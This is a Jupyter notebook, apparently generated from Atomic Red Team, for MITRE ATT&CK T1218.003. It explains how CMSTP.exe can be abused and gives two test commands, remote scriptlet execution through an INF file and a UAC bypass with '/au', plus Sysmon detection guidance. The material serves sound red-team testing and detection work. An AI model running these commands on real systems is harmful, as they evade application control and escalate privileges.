{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e11672f2",
   "metadata": {},
   "source": "# T1218.003 - CMSTP\nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)"
  },
  {
   "cell_type": "markdown",
   "id": "cfa2b957",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f99a7248",
   "metadata": {},
   "source": "### Atomic Test #1 - CMSTP Executing Remote Scriptlet\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: INF file must exist on disk at specified location (#{inf_file_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003.inf\" -OutFile \"PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dfb99d41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "dd6f1918",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmstp.exe /s PathToAtomicsFolder\\T1218.003\\src\\T1218.003.inf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a8d04e8d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ad4def73",
   "metadata": {},
   "source": "### Atomic Test #2 - CMSTP Executing UAC Bypass\nAdversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: INF file must exist on disk at specified location (#{inf_file_uac})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile \"PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8567d123",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2b7beb63",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmstp.exe /s PathToAtomicsFolder\\T1218.003\\src\\T1218.003_uacbypass.inf /au\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0547b09",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "ce9be40e",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\n\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\n\n* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\n* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}